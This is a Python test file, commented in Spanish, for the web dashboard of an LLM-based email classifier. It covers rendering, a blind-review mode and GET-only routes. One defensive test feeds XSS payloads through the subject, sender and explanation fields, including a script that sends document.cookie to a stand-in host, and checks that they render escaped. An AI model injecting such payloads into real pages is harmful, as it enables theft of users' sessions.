"""
Tests del dashboard (Fase 8).

El dashboard es la primera parte del sistema que renderiza en pantalla texto
escrito por terceros: el asunto lo escribe quien manda el correo y la
explicación la escribe un LLM que ha leído ese correo. Por eso el test más
importante de este archivo no es que la lista se vea bonita, sino que un correo
hostil no consiga inyectar HTML.
"""

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import select

from mailpilot.api import app
from mailpilot.db import get_session
from mailpilot.models import ActionProposal, Category, Email, ProposalStatus
from mailpilot.repository import (
    decidir_propuesta,
    generar_propuestas,
    save_classification,
    upsert_emails,
)
from tests.test_repository import make_email

pytestmark = pytest.mark.db


@pytest.fixture
def client(session):
    app.dependency_overrides[get_session] = lambda: session
    with TestClient(app) as test_client:
        yield test_client
    app.dependency_overrides.clear()


def propuesta_lista(session, categoria=Category.PROMOCIONES, razon="porque sí", **campos):
    """Deja una propuesta pendiente y la devuelve."""
    email_data = make_email(campos.pop("message_id", "a"), **campos)
    upsert_emails(session, [email_data])
    email = session.execute(
        select(Email).where(Email.gmail_message_id == email_data.gmail_message_id)
    ).scalar_one()

    save_classification(
        session,
        email_id=email.id,
        category=categoria,
        confidence=0.9,
        reasoning=razon,
        model_used="qwen3:8b",
    )
    generar_propuestas(session)

    return session.execute(
        select(ActionProposal).where(ActionProposal.email_id == email.id)
    ).scalar_one()


# ---------------------------------------------------------------------------
# Lo que se ve
# ---------------------------------------------------------------------------


def test_pinta_las_propuestas_pendientes(client, session):
    propuesta_lista(
        session,
        categoria=Category.TRABAJO,
        razon="es una oferta de empleo",
        subject="Entrevista el jueves",
        sender="rrhh@empresa.com",
    )

    html = client.get("/").text

    assert "Entrevista el jueves" in html
    assert "rrhh@empresa.com" in html
    assert "es una oferta de empleo" in html


def test_marca_la_categoria_que_propuso_el_modelo(client, session):
    """
    El chip de la categoría propuesta se pinta distinto: pulsarlo es aprobar,
    pulsar otro es corregir. Si se perdiera esa marca, la usuaria no sabría
    qué le está proponiendo el modelo.
    """
    propuesta_lista(session, categoria=Category.TRABAJO)

    html = client.get("/").text

    assert 'class="chip propuesta-actual"' in html
    assert 'data-categoria="trabajo"' in html
    # Están las siete opciones, no solo la propuesta: corregir es un clic.
    for categoria in Category:
        assert f'data-categoria="{categoria.value}"' in html


def test_las_decididas_desaparecen_de_la_pantalla(client, session):
    propuesta = propuesta_lista(session, subject="Ya la decidí")
    decidir_propuesta(session, propuesta.id, ProposalStatus.APPROVED)

    html = client.get("/").text

    assert "Ya la decidí" not in html
    assert "No hay nada pendiente" in html


def test_estado_vacio(client):
    respuesta = client.get("/")

    assert respuesta.status_code == 200
    assert "No hay nada pendiente" in respuesta.text


def test_muestra_el_acierto_real(client, session):
    """
    Dos decisiones, una aceptada y una corregida => 50 % de acierto.

    Este número sale del uso real, no del conjunto de evaluación de la Fase 6:
    cada corrección es una etiqueta correcta conseguida sin etiquetar a mano.
    """
    primera = propuesta_lista(session, Category.PROMOCIONES, message_id="a")
    segunda = propuesta_lista(session, Category.PROMOCIONES, message_id="b")

    decidir_propuesta(session, primera.id, ProposalStatus.APPROVED)
    decidir_propuesta(session, segunda.id, ProposalStatus.MODIFIED, Category.TRABAJO)

    html = client.get("/").text

    assert "50 %" in html
    assert "acierto real" in html


# ---------------------------------------------------------------------------
# Modo ciego
# ---------------------------------------------------------------------------


def test_el_modo_ciego_oculta_lo_que_dijo_el_modelo(client, session):
    """
    En modo ciego no debe verse NADA de la respuesta del modelo: ni el chip
    resaltado, ni el ✓, ni la explicación, ni el acierto acumulado.

    No es cosmética. Ver la respuesta antes de pensar la tuya sesga hacia darle
    la razón, y con etiquetas así el acierto medido sale inflado. Es el mismo
    error que costó 18,7 puntos en la Fase 6, por otro camino.
    """
    propuesta_lista(session, categoria=Category.TRABAJO, razon="es una oferta de empleo")

    html = client.get("/?ciego=1").text

    assert "es una oferta de empleo" not in html
    # Con espacio: así se busca el atributo renderizado `class="chip
    # propuesta-actual"` y no la regla CSS `.chip.propuesta-actual`, que sigue
    # estando en la hoja de estilos aunque no la use nadie.
    assert "chip propuesta-actual" not in html
    assert "✓" not in html
    assert "acierto real" not in html


def test_el_modo_ciego_sigue_dejando_decidir(client, session):
    """
    Se oculta la pista visual, no la funcionalidad: los siete botones siguen
    ahí y el navegador sigue sabiendo si tu clic es aprobar o corregir.
    """
    propuesta_lista(session, categoria=Category.TRABAJO)

    html = client.get("/?ciego=1").text

    for categoria in Category:
        assert f'data-categoria="{categoria.value}"' in html
    assert 'data-propuesta="1"' in html
    assert "Modo ciego" in html


def test_el_modo_normal_sigue_enseñandolo_todo(client, session):
    """El modo ciego se pide a propósito; por defecto no se activa."""
    propuesta_lista(session, categoria=Category.TRABAJO, razon="es una oferta de empleo")

    html = client.get("/").text

    assert "es una oferta de empleo" in html
    assert "propuesta-actual" in html
    assert "Modo ciego" not in html


# ---------------------------------------------------------------------------
# Seguridad
# ---------------------------------------------------------------------------


def test_un_correo_hostil_no_inyecta_html(client, session):
    """
    EL TEST IMPORTANTE DE LA FASE 8.

    El asunto lo escribe quien manda el correo, y la explicación la escribe un
    modelo que acaba de leer ese correo. Los dos son texto de origen no fiable
    pintado en una página.

    El proyecto ya impide que un correo consiga que el modelo PROPONGA algo
    (esquema cerrado). Esta es la otra mitad: que tampoco consiga EJECUTAR algo
    en el navegador de la usuaria.

    Lo garantiza el autoescapado de Jinja2. Si alguien añade `|safe` a estos
    campos en la plantilla, este test se pone rojo.
    """
    propuesta_lista(
        session,
        subject="<script>alert('robado')</script>",
        sender="<img src=x onerror=alert(1)>@malo.com",
        razon="<script>fetch('http://malo/'+document.cookie)</script>",
    )

    html = client.get("/").text

    # El texto sigue estando: escapado, se LEE pero no se EJECUTA.
    assert "&lt;script&gt;" in html

    # Lo que importa es que no haya llegado a abrirse ninguna etiqueta. Basta
    # con que `<` sea `&lt;` para que el navegador lo trate como texto: la
    # cadena `onerror=alert(1)` puede aparecer y es inofensiva mientras no
    # forme parte de una etiqueta de verdad.
    assert "<script>alert" not in html
    assert "<script>fetch" not in html
    assert "<img" not in html


def test_el_dashboard_no_escribe_nada():
    """
    El dashboard sirve HTML y punto: todas sus rutas son GET.

    Las decisiones las manda el navegador a los endpoints JSON de api.py, que
    son el único camino de escritura del sistema. Si algún día alguien añade
    aquí un POST que escriba directamente, se saltaría las reglas de
    `decidir_propuesta` (una decisión por propuesta, no sobrescribir lo que
    dijo el modelo, registro de auditoría).
    """
    from mailpilot import web

    for route in web.router.routes:
        assert route.methods == {"GET"}, f"{route.path} escribe algo"
